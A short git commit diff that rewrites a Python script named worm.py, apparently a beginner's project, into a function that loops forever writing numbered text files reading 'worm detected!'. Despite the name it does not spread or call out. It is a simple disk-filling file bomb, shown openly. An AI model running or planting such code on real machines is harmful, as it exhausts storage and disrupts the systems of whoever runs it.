c5bdb5ebeb3e4e2d57ff32dad9d60fd9db08530e
hackerSploit <ruanvsd2024@gmail.com>
2024-12-07 19:18:01 -0300

    Add files via upload

--- worm.py
+++ worm.py
@@ -1,7 +1,10 @@
-import os
-i = 0
-while True:
-	print("oi, você está sendo hackeado :)")
-	open(f"hacked{i}.txt", "w").write("worm detected!")
-	i += 1
-	
+# cria uma função chamada worm
+def worm():
+	i = 0
+	while True: # cria um arquivo infinitamente
+	   with open(f"nome{i}.txt", 'w') as worm:
+	   	worm.write("worm detected!)")
+	   	i += 1		
+
+# fecha a funcão worm			
+worm()
